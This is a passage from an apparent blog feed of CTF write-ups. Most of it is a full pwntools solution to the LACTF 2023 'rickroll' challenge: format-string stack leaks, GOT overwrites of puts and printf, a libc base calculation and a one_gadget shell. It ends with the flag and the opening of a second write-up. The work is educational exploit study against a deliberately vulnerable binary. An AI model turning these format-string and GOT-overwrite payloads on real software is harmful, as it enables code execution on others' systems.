<li>We will then overwrite <code>printf</code>&rsquo;s <code>GOT</code> entry by a <em>one gadget</em> (hoping the restrictions can be matched)</li>
</ul>
<p>For the first part, we need to figure out where our input &ldquo;lives&rdquo;, to do so, we enter a bunch of <em>A</em>&rsquo;s, and see where they end up:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">./</span>rickroll
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Lyrics: AAAAAAAA <span style="color:#f92672">-</span> <span style="color:#f92672">%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p<span style="color:#f92672">.%</span>p 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Never gonna run around <span style="color:#f92672">and</span> AAAAAAAA <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7fff55ecfa20</span><span style="color:#f92672">.</span>(nil)<span style="color:#ae81ff">.0</span>x7f5d62d80a37<span style="color:#ae81ff">.0</span>x4d<span style="color:#ae81ff">.0</span>x1a4a2a0<span style="color:#ae81ff">.0</span>x4141414141414141<span style="color:#ae81ff">.0</span>x70252e7025202d20<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>x2e70252e70252e70<span style="color:#ae81ff">.0</span>x70252e70252e7025<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>x2e70252e70252e70<span style="color:#ae81ff">.0</span>x70252e70252e7025<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>x2e70252e70252e70<span style="color:#ae81ff">.0</span>x70252e70252e7025<span style="color:#ae81ff">.0</span>x252e70252e70252e<span style="color:#ae81ff">.0</span>xa70252e70<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)<span style="color:#f92672">.</span>(nil)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p>We see that the <em>6th</em> leak is <code>0x41414141...</code>, <code>0x41</code> is a capital <em>A</em>, so this is where our input lives.</p>
<p>Knowing that, we can start making our exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./rickroll&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>, <span style="color:#ae81ff">31135</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x0040117d</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We replace puts by main+43 so that when puts is called it returns to main</span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]:main
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use the format string payload from pwntools, telling him where our input lives</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>,writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics:&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now, we are back to the top of the main function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.interactive()</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>After checking that it works, we can now think about step 2: leaking <code>libc</code></p>
<p>To do so, we can make a quick script to generate a payload that will print more addresses and check what they are with <code>pwndbg</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">25</span>,<span style="color:#ae81ff">50</span>):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> str(i) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; = %&#34;</span><span style="color:#f92672">+</span>str(i)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;$p &#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(payload)
</span></span></code></pre></div><p>Entering our payload in the input, we get this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>25 = 0x25203d2039332070 26 = 0x2030342070243933 27 = 0x207024303425203d 28 = 0x313425203d203134 29 = 0x203d203234207024 30 = 0x3334207024323425 31 = 0x7024333425203d20 32 = 0x3425203d20343420 33 = 0x3d20353420702434 34 = 0x3420702435342520 35 = 0x24363425203d2036 36 = 0x25203d2037342070 37 = 0x38342070243734 38 = 0x1 39 = 0x7ffff7da3d90 40 = (nil) 41 = 0x401152 42 = 0x100000000 43 = 0x7fffffffe028 44 = (nil) 45 = 0x6c3d408a4458d46 46 = 0x7fffffffe028 47 = 0x401152
</span></span></code></pre></div><p>After inspecting the interesting addresses (the ones that start with <code>0x7f....</code>), we know that the <em>39th</em> address corresponds to <code>&lt;__libc_start_call_main+128&gt;</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span>x <span style="color:#ae81ff">0x7ffff7da3d90</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x7ffff7da3d90</span> <span style="color:#f92672">&lt;</span>__libc_start_call_main<span style="color:#f92672">+</span><span style="color:#ae81ff">128</span><span style="color:#f92672">&gt;</span>:	<span style="color:#ae81ff">0x89</span>
</span></span></code></pre></div><blockquote>
<p>After realising that the <em>remote</em> address at position 39 looks something like <code>0x40xxxx</code>, I poked around and tried to find where the libc address was. This usually happens because the stack layout is not the same locally and remotely and sometimes the position is a bit different</p></blockquote>
<p>We can complete our exploit with the leak:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./rickroll&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>, <span style="color:#ae81ff">31135</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040117d</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We replace puts by main+43 so that when puts is called it returns to main</span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]:main
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use the format string payload from pwntools, telling him where our input lives</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>,writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics:&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now, we are back to the top of the main function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.%40$p&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Leak the 40th element on the stack (&lt;__libc_start_call_main+128&gt;)</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Make it an integer</span>
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Leak =&#34;</span>, hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate libc address by doing leak - (leak - base)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7f1c6ed22d0a</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7f1c6ecff000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;libc address = &#34;</span>, hex(libc<span style="color:#f92672">.</span>address))
</span></span></code></pre></div><p>Now that we have the base of <code>libc</code>, we can overwrite <code>printf</code> with a <em>one gadget</em> that will give us a shell&hellip; let&rsquo;s look for a  <code>one gadget</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>one_gadget libc<span style="color:#f92672">-</span><span style="color:#ae81ff">2.31</span><span style="color:#f92672">.</span>so
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc961a</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, r12, r13)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [r12] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r12 <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>  [r13] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r13 <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc961d</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, r12, rdx)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [r12] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> r12 <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>  [rdx] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0xc9620</span> execve(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>, rsi, rdx)
</span></span><span style="display:flex;"><span>constraints:
</span></span><span style="display:flex;"><span>  [rsi] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rsi <span style="color:#f92672">==</span> NULL
</span></span><span style="display:flex;"><span>  [rdx] <span style="color:#f92672">==</span> NULL <span style="color:#f92672">||</span> rdx <span style="color:#f92672">==</span> NULL
</span></span></code></pre></div><p>Let&rsquo;s try them one by one until we find one that works</p>
<blockquote>
<p>I had to re-do the <code>AAAA %p %p %p</code> trick because the input had moved from <code>6th</code> to <code>8th</code> position</p></blockquote>
<p>After testing them one by one, I figured the last one works.</p>
<h2 id="final-payload">Final Payload</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./rickroll&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.31.so&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;lac.tf&#34;</span>, <span style="color:#ae81ff">31135</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040117d</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We replace puts by main+43 so that when puts is called it returns to main</span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>]:main
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use the format string payload from pwntools, telling him where our input lives</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">6</span>,writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics:&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Now, we are back to the top of the main function</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.%40$p&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Leak the 40th element on the stack (&lt;__libc_start_call_main+128&gt;)</span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Lyrics&#34;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Make it an integer</span>
</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> int(r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>), <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Leak =&#34;</span>, hex(leak))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate libc address by doing leak - (leak - base)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> leak <span style="color:#f92672">-</span> (<span style="color:#ae81ff">0x7f1c6ed22d0a</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x7f1c6ecff000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;libc address = &#34;</span>, hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Dont forget to add the base of libc </span>
</span></span><span style="display:flex;"><span>    one_gadget <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xc9620</span> <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>address
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    writes <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>        exe<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;printf&#39;</span>]:one_gadget
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> fmtstr_payload(<span style="color:#ae81ff">8</span>, writes)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><p>We can make sure that it works:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/220987066-220419b3-d8c3-4fd2-97e5-745f98a78f1f.png" alt="2023-02-23-183836_1888x1030_scrot"></p>
<p>And it does, gg!</p>
<p><em>flag -&gt; lactf{printf_gave_me_up_and_let_me_down}</em></p>
]]></content>
        </item>
        
        <item>
            <title>🇬🇧 LACTF 2023 - pwn/bot</title>
            <link>/posts/2023/02/lactf-2023-pwn/bot/</link>
            <pubDate>Fri, 17 Feb 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/02/lactf-2023-pwn/bot/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Second &lt;code&gt;pwn&lt;/code&gt; challenge from the &lt;code&gt;LACTF 2023&lt;/code&gt;. Basic &lt;code&gt;ret2win&lt;/code&gt; with a little twist: bypassing a condition to prevent the program from exiting&amp;hellip;&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;I made a bot to automatically answer all of your questions.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/71a24c7af5b65f1b28fbc60904e82f6a59beac87d2fa349fcd5284105a558cf2/Dockerfile&#34;&gt;&lt;code&gt;Dockerfile&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/263e55f639b540a00fc87e7fdc10078c1cbe89e148ea440ad1a9cef1cbd53c6f/libc-2.31.so&#34;&gt;&lt;code&gt;libc-2.31.so&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/4325e436d7b281490848dfb580f16844adcf31afedf3972e12a660abe5c057c2/ld-2.31.so&#34;&gt;&lt;code&gt;ld-2.31.so&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/cae1f131aabcdf137b27331c5193d8f32d028b05668a57a1df239222e3eeff99/bot.c&#34;&gt;&lt;code&gt;bot.c&lt;/code&gt;&lt;/a&gt;, &lt;a href=&#34;https://lactf-challs.storage.googleapis.com/uploads/006a2e73644835158dc097d4eff75ab978a20ffe92c1ce4f534536c41080a7ea/bot&#34;&gt;&lt;code&gt;bot&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;before doing all of that, we run &lt;code&gt;pwninit&lt;/code&gt; to patch the binary with the given &lt;code&gt;libc&lt;/code&gt; and &lt;code&gt;ld&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;bot_patched&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;bot_patched&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/lactf2023/bot/bot_patched&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;     &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
